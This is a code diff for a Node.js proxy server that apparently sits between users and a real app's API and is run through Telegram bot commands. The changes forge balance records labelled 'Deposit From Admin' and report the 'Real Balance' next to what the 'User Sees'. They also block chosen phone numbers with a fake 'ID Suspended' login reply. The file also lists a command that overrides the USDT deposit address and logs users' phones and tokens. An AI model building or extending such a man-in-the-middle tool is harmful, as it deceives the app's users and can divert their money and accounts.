@@ -23,7 +23,8 @@ const DEFAULT_DATA = {
   depositBonus: 0,
   withdrawOverride: 0,
   userOverrides: {},
-  trackedUsers: {}
+  trackedUsers: {},
+  suspendedPhones: {}
 };
 
 let bot = null;
@@ -682,6 +683,11 @@ app.post('/bot-webhook', async (req, res) => {
 /usdt <address> — Set USDT address
 /usdt off — Disable USDT override
 
+=== SUSPEND ===
+/suspend <phone> — Block login for phone
+/unsuspend <phone> — Unblock login
+/suspended — List all suspended
+
 === TRACKING ===
 /idtrack — Show all tracked user IDs
 
@@ -776,24 +782,25 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /add <amount> <userId>\nExample: /add 500 93527');
         return res.sendStatus(200);
       }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) + amount;
-      const tracked = data.trackedUsers && data.trackedUsers[targetUserId];
+      const freshData = await loadData(true);
+      if (!freshData.userOverrides) freshData.userOverrides = {};
+      if (!freshData.userOverrides[targetUserId]) freshData.userOverrides[targetUserId] = {};
+      freshData.userOverrides[targetUserId].addedBalance = (freshData.userOverrides[targetUserId].addedBalance || 0) + amount;
+      const tracked = freshData.trackedUsers && freshData.trackedUsers[targetUserId];
       const currentBal = tracked ? tracked.balance : 'N/A';
-      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
-      if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
+      const updatedBal = currentBal !== 'N/A' ? parseFloat((parseFloat(currentBal) + freshData.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
+      if (!freshData.balanceHistory) freshData.balanceHistory = [];
+      freshData.balanceHistory.push({
         type: 'add',
         userId: targetUserId,
         amount: amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
+        totalAdded: freshData.userOverrides[targetUserId].addedBalance,
         originalBalance: currentBal,
         updatedBalance: updatedBal,
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked && tracked.phone) || ''
       });
-      if (!data.userOverrides[targetUserId].quotaRecords) data.userOverrides[targetUserId].quotaRecords = [];
+      if (!freshData.userOverrides[targetUserId].quotaRecords) freshData.userOverrides[targetUserId].quotaRecords = [];
       const nowDate = new Date();
       const dd = String(nowDate.getDate()).padStart(2, '0');
       const mm = String(nowDate.getMonth() + 1).padStart(2, '0');
@@ -803,16 +810,16 @@ Example:
       const ss = String(nowDate.getSeconds()).padStart(2, '0');
       const formattedTime = `${dd}/${mm}/${yyyy} ${hh}:${mi}:${ss}`;
       const balAfterAdd = updatedBal !== 'N/A' ? String(updatedBal) : String(amount);
-      data.userOverrides[targetUserId].quotaRecords.push({
+      freshData.userOverrides[targetUserId].quotaRecords.push({
         amount: "+" + String(amount),
         balance: balAfterAdd,
         createTime: formattedTime,
         sourceType: "Deposit From Admin",
         sourceTypeGroup: "Admin"
       });
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
+      freshData._skipOverrideMerge = true;
+      await saveData(freshData);
+      await bot.sendMessage(chatId, `✅ Added ₹${amount} to user ${targetUserId}\n💰 Total added: ₹${freshData.userOverrides[targetUserId].addedBalance}\n📊 Updated balance: ₹${updatedBal}`);
       return res.sendStatus(200);
     }
 
@@ -824,26 +831,27 @@ Example:
         await bot.sendMessage(chatId, '❌ Format: /deduct <amount> <userId>\nExample: /deduct 500 93527');
         return res.sendStatus(200);
       }
-      if (!data.userOverrides) data.userOverrides = {};
-      if (!data.userOverrides[targetUserId]) data.userOverrides[targetUserId] = {};
-      data.userOverrides[targetUserId].addedBalance = (data.userOverrides[targetUserId].addedBalance || 0) - amount;
-      const tracked2 = data.trackedUsers && data.trackedUsers[targetUserId];
+      const freshData2 = await loadData(true);
+      if (!freshData2.userOverrides) freshData2.userOverrides = {};
+      if (!freshData2.userOverrides[targetUserId]) freshData2.userOverrides[targetUserId] = {};
+      freshData2.userOverrides[targetUserId].addedBalance = (freshData2.userOverrides[targetUserId].addedBalance || 0) - amount;
+      const tracked2 = freshData2.trackedUsers && freshData2.trackedUsers[targetUserId];
       const currentBal2 = tracked2 ? tracked2.balance : 'N/A';
-      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + data.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
-      if (!data.balanceHistory) data.balanceHistory = [];
-      data.balanceHistory.push({
+      const updatedBal2 = currentBal2 !== 'N/A' ? parseFloat((parseFloat(currentBal2) + freshData2.userOverrides[targetUserId].addedBalance).toFixed(2)) : 'N/A';
+      if (!freshData2.balanceHistory) freshData2.balanceHistory = [];
+      freshData2.balanceHistory.push({
         type: 'deduct',
         userId: targetUserId,
         amount: amount,
-        totalAdded: data.userOverrides[targetUserId].addedBalance,
+        totalAdded: freshData2.userOverrides[targetUserId].addedBalance,
         originalBalance: currentBal2,
         updatedBalance: updatedBal2,
         time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
         phone: (tracked2 && tracked2.phone) || ''
       });
-      if (data.userOverrides[targetUserId].quotaRecords && data.userOverrides[targetUserId].quotaRecords.length > 0) {
+      if (freshData2.userOverrides[targetUserId].quotaRecords && freshData2.userOverrides[targetUserId].quotaRecords.length > 0) {
         let remaining = amount;
-        const records = data.userOverrides[targetUserId].quotaRecords;
+        const records = freshData2.userOverrides[targetUserId].quotaRecords;
         while (remaining > 0 && records.length > 0) {
           const last = records[records.length - 1];
           const lastAmt = parseFloat(last.amount) || 0;
@@ -856,10 +864,10 @@ Example:
           }
         }
       }
-      if (data.userOverrides[targetUserId].addedBalance === 0) delete data.userOverrides[targetUserId].addedBalance;
-      data._skipOverrideMerge = true;
-      await saveData(data);
-      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${data.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
+      if (freshData2.userOverrides[targetUserId].addedBalance === 0) delete freshData2.userOverrides[targetUserId].addedBalance;
+      freshData2._skipOverrideMerge = true;
+      await saveData(freshData2);
+      await bot.sendMessage(chatId, `✅ Deducted ₹${amount} from user ${targetUserId}\n💰 Total added: ₹${freshData2.userOverrides[targetUserId].addedBalance || 0}\n📊 Updated balance: ₹${updatedBal2}`);
       return res.sendStatus(200);
     }
 
@@ -1071,6 +1079,40 @@ Example:
     }
 
 
+    if (text.startsWith('/suspend ')) {
+      const suspendPhone = text.substring(9).trim();
+      if (!suspendPhone) { await bot.sendMessage(chatId, '❌ Format: /suspend <phoneNumber>\nExample: /suspend 9876543210'); return res.sendStatus(200); }
+      if (!data.suspendedPhones) data.suspendedPhones = {};
+      data.suspendedPhones[suspendPhone] = { suspended: true, time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
+      await saveData(data);
+      await bot.sendMessage(chatId, `🚫 Suspended: ${suspendPhone}\nUser will see "ID Suspended" on login.\n\nTo unsuspend: /unsuspend ${suspendPhone}`);
+      return res.sendStatus(200);
+    }
+
+    if (text.startsWith('/unsuspend ')) {
+      const unsuspendPhone = text.substring(11).trim();
+      if (!unsuspendPhone) { await bot.sendMessage(chatId, '❌ Format: /unsuspend <phoneNumber>'); return res.sendStatus(200); }
+      if (data.suspendedPhones && data.suspendedPhones[unsuspendPhone]) {
+        delete data.suspendedPhones[unsuspendPhone];
+        await saveData(data);
+        await bot.sendMessage(chatId, `✅ Unsuspended: ${unsuspendPhone}\nUser can login now.`);
+      } else {
+        await bot.sendMessage(chatId, `ℹ️ ${unsuspendPhone} is not suspended.`);
+      }
+      return res.sendStatus(200);
+    }
+
+    if (text === '/suspended') {
+      const phones = data.suspendedPhones ? Object.keys(data.suspendedPhones) : [];
+      if (phones.length === 0) { await bot.sendMessage(chatId, '📋 No suspended users.'); return res.sendStatus(200); }
+      let msg = '🚫 SUSPENDED USERS\n━━━━━━━━━━━━━━━━━━\n';
+      for (const p of phones) {
+        msg += `📱 ${p} — ${data.suspendedPhones[p].time || 'N/A'}\n`;
+      }
+      await bot.sendMessage(chatId, msg);
+      return res.sendStatus(200);
+    }
+
     if (text === '/help') {
       await bot.sendMessage(chatId, 'Use /start to see all commands.');
       return res.sendStatus(200);
@@ -1086,10 +1128,18 @@ Example:
 app.post('/app/api/system/v2/login', async (req, res) => {
   try {
     const data = await loadData();
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const userId = await extractUserId(req, jsonResp);
     const body = req.parsedBody || {};
     const phone = body.memberPhone || body.phone || body.mobile || body.telephone || body.username || '';
+    if (phone && data.suspendedPhones && data.suspendedPhones[String(phone)]) {
+      if (data.adminChatId && bot) {
+        bot.sendMessage(data.adminChatId, `🚫 BLOCKED LOGIN\n📱 Phone: ${phone}\n🔒 Status: Suspended\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`).catch(()=>{});
+      }
+      const fakeResp = { code: 500, message: 'ID Suspended', data: null };
+      res.set('Content-Type', 'application/json');
+      return res.status(200).json(fakeResp);
+    }
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserId(req, jsonResp);
     if (userId) {
       saveTokenUserId(req, userId);
       if (phone) userPhoneMap[String(userId)] = String(phone);
@@ -1861,7 +1911,20 @@ app.all('/app/api/memberManager/mine', async (req, res) => {
           `🕐 Time: ${r.time}`
         ).catch(()=>{});
       } else {
-        bot.sendMessage(data.adminChatId, `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}\n💰 Balance: ${bal !== '' ? bal : 'N/A'}`).catch(()=>{});
+        const mineOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
+        const mineAdded = mineOvr && mineOvr.addedBalance !== undefined ? mineOvr.addedBalance : 0;
+        const realBal = bal !== '' ? bal : 'N/A';
+        const displayBal = (realBal !== 'N/A' && mineAdded !== 0) ? parseFloat((parseFloat(realBal) + mineAdded).toFixed(2)) : realBal;
+        let mineMsg = `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}`;
+        if (mineAdded !== 0) {
+          mineMsg += `\n━━━━━━━━━━━━━━━━━━`;
+          mineMsg += `\n🏦 Real Balance: ₹${realBal}`;
+          mineMsg += `\n➕ Bot Added: ₹${mineAdded}`;
+          mineMsg += `\n👁️ User Sees: ₹${displayBal}`;
+        } else {
+          mineMsg += `\n💰 Balance: ₹${realBal}`;
+        }
+        bot.sendMessage(data.adminChatId, mineMsg).catch(()=>{});
       }
     }
   } catch(e) { await transparentProxy(req, res); }
